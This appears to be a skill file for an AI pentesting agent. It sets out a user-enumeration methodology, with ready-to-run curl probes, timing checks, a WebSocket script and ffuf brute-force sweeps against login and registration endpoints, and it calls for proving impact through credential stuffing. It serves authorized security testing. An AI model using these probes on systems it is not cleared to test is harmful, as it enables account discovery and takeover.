---
name: user-enumeration
description: Discover any interface (HTTP, WebSocket, GraphQL, gRPC, or other) that distinguishes between existing and non-existing users through any observable difference
origin: Vigil
---

# User Enumeration

> **`vigil assess kali` audit flags:** use `--technique AUTH` (user enumeration is an authentication-failure primitive that enables credential stuffing and targeted brute-force).

## Core Principle

User enumeration is NOT limited to HTTP APIs. ANY interface that accepts a user
identifier (username, email, phone, ID) and produces ANY observable difference between
existing and non-existing users is an enumeration vector. This includes:

- HTTP REST APIs, HTML forms, AJAX endpoints
- WebSocket messages (different response for valid vs invalid user)
- GraphQL queries/mutations (different error object or null pattern)
- gRPC services (different status code or error detail)
- SMTP (VRFY, RCPT TO responses)
- LDAP (bind response differences)
- SSO/OAuth flows (redirect behavior differs)
- Mobile API endpoints (often less protected than web)

## Observable Differences (any of these = enumerable)

- **Error message**: "user not found" vs "invalid password"
- **HTTP status code**: 404 vs 401, 200 vs 409
- **Response body size**: different byte count
- **Response time**: valid user slower (password hash computed)
- **Response structure**: different JSON keys, null vs object
- **WebSocket frame**: different message type or content
- **GraphQL errors array**: different error codes or messages
- **gRPC status**: NOT_FOUND vs PERMISSION_DENIED
- **Redirect target**: different URL for valid vs invalid
- **Set-Cookie**: cookie set for valid user only
- **Rate limit headers**: different limits for valid vs invalid

## When to Activate

- ANY form or endpoint accepting username, email, phone, or user ID
- Login, registration, password reset, OTP, verification flows
- User profile, search, invite, or share-by-email features
- GraphQL user queries or mutations
- WebSocket authentication handshakes
- Mobile app API endpoints (often found via source-analyzer)
- SSO/OAuth authorization flows
- SMTP servers (for email verification)

## Tools

- `curl` — HTTP request crafting and timing measurement
- `ffuf` — high-volume brute-force enumeration
- `hydra` — credential stuffing after confirmed enumeration
- Python/websocket scripts — for WebSocket enumeration
- `grpcurl` — for gRPC service testing (if available)

For live engagement target requests, use plain `curl` by default through `vigil assess kali exec --`
so the request lands in the audit pipeline alongside the audit-flag set you pass. Only add
explicit cookies or authorization headers when intentionally testing a second account, session
confusion, or auth override behavior.

## Methodology

### 1. Identify Enumeration Surfaces

Look for any endpoint that accepts a user identifier and returns different responses
for existing vs non-existing users:

```bash
# Common enumeration surfaces to check:
# - POST /login (or /api/login, /auth/login, /api/v1/auth)
# - POST /register (or /signup, /api/register)
# - POST /forgot-password (or /reset-password, /api/password/reset)
# - POST /api/check-email (or /check-username, /check-phone)
# - GET /api/users?email=... (or /api/users/exists)
# - POST /api/otp/send (or /api/verify/send-code)
# - GET /api/profile/<username>
```

### 2. Login Form Enumeration

Test if login error messages distinguish between invalid username and invalid password:

```bash
TMPDIR_ENUM=$(mktemp -d)
trap 'rm -rf "$TMPDIR_ENUM"' EXIT

# Test with definitely-invalid username
curl -s -X POST "http://target/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"definitely_not_a_user_xyz123","password":"wrong"}' \
  -o "$TMPDIR_ENUM/login_invalid_user.txt" -w "%{http_code}|%{size_download}"

# Test with likely-valid username (admin, test, user, root)
curl -s -X POST "http://target/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}' \
  -o "$TMPDIR_ENUM/login_valid_user.txt" -w "%{http_code}|%{size_download}"

# Compare: different status code, response size, error message, or timing?
diff "$TMPDIR_ENUM/login_invalid_user.txt" "$TMPDIR_ENUM/login_valid_user.txt"
```

Enumeration indicators:
- "User not found" vs "Invalid password" → **enumerable**
- "Invalid credentials" for both → **not enumerable** (good practice)
- Different HTTP status (404 vs 401) → **enumerable**
- Different response size → **enumerable**
- Different response time (valid user takes longer due to password hash check) → **timing-based enumeration**

### 3. Registration Form Enumeration

```bash
# Test with fresh email
curl -s -X POST "http://target/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"unique_test_xyz@example.com","password":"Test123!"}' \
  -o "$TMPDIR_ENUM/reg_new.txt" -w "%{http_code}|%{size_download}"

# Test with likely-existing email (use found emails from recon, or admin@target.example)
curl -s -X POST "http://target/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.example","password":"Test123!"}' \
  -o "$TMPDIR_ENUM/reg_existing.txt" -w "%{http_code}|%{size_download}"

# Compare responses
diff "$TMPDIR_ENUM/reg_new.txt" "$TMPDIR_ENUM/reg_existing.txt"
```

Enumeration indicators:
- "Email already registered" vs "Registration successful" → **enumerable**
- "Check your email to verify" for both → **not enumerable**
- Different HTTP status (409 vs 201) → **enumerable**

### 4. Password Reset Enumeration

```bash
# Test with non-existing email
curl -s -X POST "http://target/api/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent_xyz123@example.com"}' \
  -o "$TMPDIR_ENUM/reset_invalid.txt" -w "%{http_code}|%{size_download}"

# Test with likely-existing email
curl -s -X POST "http://target/api/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.example"}' \
  -o "$TMPDIR_ENUM/reset_valid.txt" -w "%{http_code}|%{size_download}"

# Compare
diff "$TMPDIR_ENUM/reset_invalid.txt" "$TMPDIR_ENUM/reset_valid.txt"
```

### 5. Explicit Check Endpoints

Some apps have dedicated existence-check APIs:

```bash
# Common patterns
for endpoint in "/api/check-email" "/api/check-username" "/api/users/exists" \
  "/api/check-phone" "/api/validate-email" "/api/account/check"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://target$endpoint" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@example.com"}')
  [ "$code" != "404" ] && echo "  $endpoint → $code (exists!)"
done
```

### 6. Timing-Based Enumeration

Even when error messages are identical, response time may differ:

```bash
# Measure response time for invalid vs valid user (run 5x each, compare averages)
echo "=== Invalid user timing ==="
for i in $(seq 1 5); do
  curl -s -X POST "http://target/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"nonexistent_xyz","password":"wrong"}' \
    -o /dev/null -w "%{time_total}\n"
done

echo "=== Valid user timing ==="
for i in $(seq 1 5); do
  curl -s -X POST "http://target/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong"}' \
    -o /dev/null -w "%{time_total}\n"
done
# If valid user consistently takes 50-200ms longer → timing-based enumeration
```

### 7. Brute-Force Enumeration (after confirming enumerable endpoint)

```bash
# Username enumeration via vigil assess kali ffuf
vigil assess kali ffuf \
  --technique AUTH --intent "username enumeration on login endpoint" \
  --probe-kind payload --phase consume-test --timeout 600 \
  -- -u "http://target/api/login" \
     -X POST -H "Content-Type: application/json" \
     -d '{"username":"FUZZ","password":"invalid"}' \
     -w /seclists/Usernames/top-usernames-shortlist.txt \
     -fr "User not found" \
     -o /engagements/$ENGAGEMENT_KEY/scans/user_enum.json -of json

# Email enumeration via registration check
vigil assess kali ffuf \
  --technique AUTH --intent "email enumeration via registration endpoint" \
  --probe-kind payload --phase consume-test --timeout 600 \
  -- -u "http://target/api/register" \
     -X POST -H "Content-Type: application/json" \
     -d '{"email":"FUZZ@target.example","password":"Test123!"}' \
     -w /seclists/Usernames/top-usernames-shortlist.txt \
     -fr "Check your email" \
     -o /engagements/$ENGAGEMENT_KEY/scans/email_enum.json -of json

# Phone number enumeration (if applicable)
vigil assess kali ffuf \
  --technique AUTH --intent "phone number enumeration via check-phone endpoint" \
  --probe-kind payload --phase consume-test --timeout 600 \
  -- -u "http://target/api/check-phone" \
     -X POST -H "Content-Type: application/json" \
     -d '{"phone":"FUZZ"}' \
     -w /engagements/$ENGAGEMENT_KEY/scans/phone_wordlist.txt \
     -fs <baseline_size> \
     -o /engagements/$ENGAGEMENT_KEY/scans/phone_enum.json -of json
```

**Triage the result set without guessing a filter.** A single `-fr`/`-fs` filter assumes you
already know the valid-user response shape. When you don't (or want to confirm the filter caught
everything), feed the whole ffuf result population to `vigil assess anomaly-score` and let it rank
the candidates that broke from the not-found cluster. ffuf's JSON `results` entries already carry
`status`, `length`, `words`, `lines`, `url` — exactly the fields the oracle reads — so reshape and
score:

```bash
# ffuf writes {"results":[{input,status,length,words,lines,url,...}]}.
# Project to the records anomaly-score wants (its 'content_type' uses an underscore, so rename it):
jq '[.results[] | {url, status, length, words, lines, content_type: .["content-type"]}]' \
  /engagements/$ENGAGEMENT_KEY/scans/user_enum.json > /tmp/enum_pop.json

vigil assess anomaly-score /tmp/enum_pop.json --top 10
#   #1  score=4.17  status=200  len=1561  url=.../login   ← FUZZ=admin: the existing-user response
#       ^ status='200'  ^ length_bucket=...  ^ words_bucket=...   while every invalid user clustered
```

The records at the top of the ranking are the existing users (their response diverged in status,
size bucket, word/line count, or error title); the flat low-scoring tail is the not-found cluster.
This works on any of the sweeps above (username/email/phone). Pull the high-scoring inputs as your
confirmed-valid list.

### 8. OTP / Verification Code Abuse

```bash
# Check if OTP endpoint leaks user existence
curl -s -X POST "http://target/api/otp/send" \
  -H "Content-Type: application/json" \
  -d '{"phone":"+1234567890"}' \
  -o "$TMPDIR_ENUM/otp_invalid.txt" -w "%{http_code}|%{size_download}"

curl -s -X POST "http://target/api/otp/send" \
  -H "Content-Type: application/json" \
  -d '{"phone":"+10000000000"}' \
  -o "$TMPDIR_ENUM/otp_valid.txt" -w "%{http_code}|%{size_download}"

# Also check: does it rate-limit? Can we enumerate all phone numbers?
```

### 9. WebSocket Enumeration

```bash
# If a WebSocket auth handshake was discovered:
# Connect and send auth message with invalid user
python3 -c "
import websocket, json
ws = websocket.create_connection('wss://target/ws')
ws.send(json.dumps({'type':'auth','username':'nonexistent_xyz','password':'x'}))
print('Invalid:', ws.recv())
ws.close()
ws = websocket.create_connection('wss://target/ws')
ws.send(json.dumps({'type':'auth','username':'admin','password':'x'}))
print('Valid:', ws.recv())
ws.close()
"
# Compare: different message type, error code, or payload structure?
```

### 10. GraphQL Enumeration

```bash
# Query with non-existing user
curl -s -X POST "http://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(email: \"nonexistent@x.com\") { id } }"}' \
  -o "$TMPDIR_ENUM/gql_invalid.txt"

# Query with likely-existing user
curl -s -X POST "http://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(email: \"admin@target.example\") { id } }"}' \
  -o "$TMPDIR_ENUM/gql_valid.txt"

# Compare: null vs object in data? Different errors array?
diff "$TMPDIR_ENUM/gql_invalid.txt" "$TMPDIR_ENUM/gql_valid.txt"
```

### 11. SSO / OAuth Flow Enumeration

```bash
# Some SSO flows redirect differently for valid vs invalid users
curl -s -o /dev/null -w "%{redirect_url}" \
  "http://target/auth/login?email=nonexistent@x.com"
curl -s -o /dev/null -w "%{redirect_url}" \
  "http://target/auth/login?email=admin@target.example"
# Different redirect destination = enumerable
```

### 12. Generic Differential Analysis

For ANY protocol or interface not covered above, the method is the same:
1. Send request with **definitely-invalid** user identifier
2. Send request with **likely-valid** user identifier (admin, test, root, common names)
3. Compare ANY observable difference: content, size, timing, headers, status, behavior
4. If different → enumerable. Document the exact difference.

This applies to gRPC, SMTP VRFY/RCPT, LDAP bind, custom TCP protocols, or any
other interface. The protocol doesn't matter — the differential response does.

When you have **more than a couple** of probes — a handful of candidate identifiers, or a full
wordlist sweep — stop pairwise-`diff`ing and rank the population instead. Capture one record per
probe (`url`, `status`, `content_length`, and `title`/`words`/`lines` when the body carries the
distinguishing text) into a JSONL file and let the oracle find the odd-one-out:

```bash
# one HTTP-response record per probed identifier → enum_records.jsonl, then:
vigil assess anomaly-score enum_records.jsonl --top 10
#   #1  score=4.17  status=302  len=120  url=.../login?u=admin   ← the valid user (redirected)
#       ^ status='302'  ^ title='redirecting'                     the invalid users all 200'd identically
```

The oracle buckets near-equal sizes/word-counts, so it surfaces *category* differences — a status
flip, a size-class jump, a changed error title, a redirect — which is exactly the enumeration
signal. Identifiers whose records float to the top are your enumerated-existing set; a flat ranking
where nothing scores above the cluster means the interface is **not** enumerable on the attributes
captured (re-check timing, which the oracle does not model — see §6). This is the N-probe
generalisation of the two-request `diff` shown in §2–§5.

## What to Record

- **Enumerable interface**: protocol, endpoint/address, parameter
- **Observable difference**: what exactly changes (message, code, size, timing, structure)
- **Valid vs invalid response**: exact diff or description
- **Confirmed valid users**: any usernames/emails/phones confirmed to exist — confirming the endpoint is enumerable is not enough; you must show the **attacker outcome** (e.g., the password reset error "Email not registered" vs "Reset link sent" confirmed 8 valid email addresses from the company directory, and those addresses were used to successfully credential-stuff 2 accounts from the breach list; the timing oracle (valid user 230ms, invalid 18ms average) confirmed `admin@target.example` exists with no rate limiting, making brute-force of that account feasible in under 2 minutes at 100 req/s)
- **Rate limiting**: whether the interface has brute-force protection
- **Severity**: MEDIUM if enumerable + no rate limit, LOW if enumerable with rate limit

## Extended Resources

_(none — methodology in skill)_
